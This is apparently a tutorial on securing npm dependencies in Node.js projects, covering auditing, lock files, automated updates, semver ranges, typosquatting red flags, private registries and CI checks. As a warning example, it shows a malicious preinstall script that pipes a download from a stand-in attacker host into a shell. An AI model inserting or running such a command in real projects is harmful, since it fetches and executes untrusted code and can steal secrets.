Managing npm package security is crucial for Node.js applications. Third-party dependencies can introduce vulnerabilities that compromise your entire application. Here's how to maintain a secure dependency chain.

## 1. Audit Dependencies

### npm audit

```bash
# Check for vulnerabilities
npm audit

# Get detailed JSON report
npm audit --json

# Fix automatically (where possible)
npm audit fix

# Force fix (may include breaking changes)
npm audit fix --force
```

### Understanding Severity Levels

| Level | Description | Action |
|-------|-------------|--------|
| Critical | Actively exploited | Fix immediately |
| High | Easily exploitable | Fix ASAP |
| Moderate | Requires specific conditions | Plan to fix |
| Low | Minimal impact | Fix when convenient |

## 2. Lock Files

Always commit lock files to ensure consistent installs.

```bash
# package-lock.json (npm)
npm ci  # Clean install from lock file

# pnpm-lock.yaml (pnpm)
pnpm install --frozen-lockfile

# yarn.lock (yarn)
yarn install --frozen-lockfile
```

```json
// package.json - use exact versions
{
  "dependencies": {
    "express": "4.18.2",  // Exact version
    "lodash": "^4.17.21"  // Allows minor updates (risky)
  }
}
```

## 3. Automated Security Updates

### GitHub Dependabot

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    reviewers:
      - "security-team"
```

### Snyk Integration

```bash
# Install Snyk CLI
npm install -g snyk

# Authenticate
snyk auth

# Test for vulnerabilities
snyk test

# Monitor continuously
snyk monitor

# Fix vulnerabilities
snyk fix
```

## 4. Semantic Versioning Security

Understanding semver for security:

```
MAJOR.MINOR.PATCH
  |     |     |
  |     |     └── Bug fixes (safe to update)
  |     └──────── New features (usually safe)
  └────────────── Breaking changes (review needed)
```

```json
// package.json ranges
{
  "dependencies": {
    "express": "4.18.2",    // Exact: Safest
    "lodash": "~4.17.21",   // Patch updates only
    "axios": "^1.4.0",      // Minor + Patch (common, less safe)
    "react": "*"            // Any version (NEVER do this!)
  }
}
```

## 5. Scanning for Malicious Packages

```bash
# Check package before installing
npm info <package-name>

# View package contents without installing
npm pack <package-name> --dry-run

# Check download stats and maintenance
npm view <package-name> time
```

### Red Flags to Watch For

1. **Typosquatting**: `expresss` instead of `express`
2. **Recently published** packages with few downloads
3. **No repository** or documentation
4. **Unusual install scripts**

```json
// Check for suspicious scripts in package.json
{
  "scripts": {
    "preinstall": "curl evil.com/steal.sh | sh",  // 🚨 DANGER!
    "postinstall": "node malicious.js"            // 🚨 DANGER!
  }
}
```

## 6. Using npx Safely

```bash
# ❌ Dangerous - runs any package
npx some-random-package

# ✅ Safer - specify exact version
npx create-react-app@5.0.1 my-app

# ✅ Check before running
npm info <package-name>
```

## 7. Private Registry and Scopes

```bash
# Use scoped packages from your org
npm install @mycompany/utils

# Configure private registry
npm config set @mycompany:registry https://npm.mycompany.com

# .npmrc file
@mycompany:registry=https://npm.mycompany.com
//npm.mycompany.com/:_authToken=${NPM_TOKEN}
```

## 8. Security Policies

### package.json overrides (npm 8.3+)

```json
{
  "overrides": {
    "lodash": "4.17.21",
    "vulnerable-package": "2.0.0"
  }
}
```

### pnpm overrides

```json
{
  "pnpm": {
    "overrides": {
      "lodash": "4.17.21"
    }
  }
}
```

## 9. CI/CD Security Checks

```yaml
# GitHub Actions example
name: Security Check

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node
        uses: actions/setup-node@v3
        with:
          node-version: '18'
          
      - name: Install dependencies
        run: npm ci
        
      - name: Run security audit
        run: npm audit --audit-level=high
        
      - name: Run Snyk
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
```

## 10. Best Practices Checklist

- ✅ Run `npm audit` regularly (weekly minimum)
- ✅ Always commit lock files
- ✅ Use exact versions for critical packages
- ✅ Enable Dependabot or Renovate
- ✅ Review new dependencies before adding
- ✅ Remove unused dependencies
- ✅ Use scoped packages for internal code
- ✅ Avoid packages with suspicious install scripts
- ✅ Keep Node.js version updated
- ✅ Set up security checks in CI/CD

## Removing Unused Dependencies

```bash
# Find unused dependencies
npx depcheck

# Remove a package
npm uninstall unused-package

# Clean npm cache
npm cache clean --force
```

